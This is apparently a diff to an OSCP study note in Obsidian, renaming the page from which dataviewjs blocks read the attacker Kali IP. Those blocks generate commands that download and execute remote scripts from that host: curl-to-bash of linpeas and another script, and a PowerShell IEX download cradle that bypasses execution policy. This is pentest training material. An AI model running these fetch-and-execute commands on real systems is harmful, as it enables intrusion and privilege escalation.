@@ -10,7 +10,7 @@ cd ~/Desktop/Tools/LinPEAS && python3 -m http.server 8888
 
 Directly execute into bash without downloading anyt
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `curl http://${KaliIP}:8888/linpeas.sh | bash`;
 
@@ -18,7 +18,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 or
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `cd /tmp && wget http://${KaliIP}:8888/linpeas.sh && wget http://${KaliIP}:8888/parsePEASS.sh`;
 
@@ -53,7 +53,7 @@ cd ~/Desktop/Tools/ParsingPeas && python3 -m venv .venv && source .venv/bin/acti
 
 **Linux/Unix:**
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `cd /tmp && curl -sSL http://${KaliIP}:8000/get-script | bash`;
 
@@ -61,7 +61,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 **Windows (PowerShell):**
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://${KaliIP}:8000/wrapper-inline.ps1')"`;
 
@@ -70,7 +70,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 On MY KALI attacker, navigate to 
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `http://${KaliIP}:8000`;
 
